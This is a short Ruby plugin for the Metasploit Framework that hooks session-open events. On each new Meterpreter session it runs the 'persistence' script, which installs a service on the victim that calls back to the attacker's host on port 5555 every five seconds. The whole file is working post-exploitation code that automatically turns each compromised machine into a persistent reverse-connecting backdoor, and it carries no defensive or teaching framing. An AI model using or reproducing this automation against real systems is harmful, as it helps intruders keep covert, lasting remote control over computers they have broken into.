class MsfSessionEvent
  include ::Msf::SessionEvent

  def on_session_open(session)
    puts("on_session_open #{session}")
    session_action(session)
  end

  def on_session_close(session, reason='')
    puts("on_session_close #{session}")
  end

  def on_session_command(session, command)
    puts("on_session_command #{session} #{command}")
  end
end

def session_action(session)
  thread = Thread.new do
    begin      
      install_meterpreter(session)
    rescue ::Exception
      puts("problem in session_action: #{$!} #{$!.backtrace}")
    end
  end
end

def install_meterpreter(session)
  counter = 0
  while (!session.ext.dump_alias_tree('client').include?('client.priv') || !session.ext.dump_alias_tree('client').include?('client.stdapi'))
    counter += 1
    if counter == 10
      return
    end
    sleep(1)
  end
  script_path = Msf::Sessions::Meterpreter.find_script_path("persistence")
  rhost = session.exploit_datastore["RHOST"]
  rhost = (rhost != nil and !rhost.empty?) ? rhost : session.target_host
  lhost = Rex::Socket.source_address((rhost != nil and !rhost.empty?) ? rhost : "1.2.3.4");
  args = "-S -i 5 -p 5555 -r #{lhost}"
  puts "run: #{script_path} #{args}"
  session.execute_file(script_path, args)
end
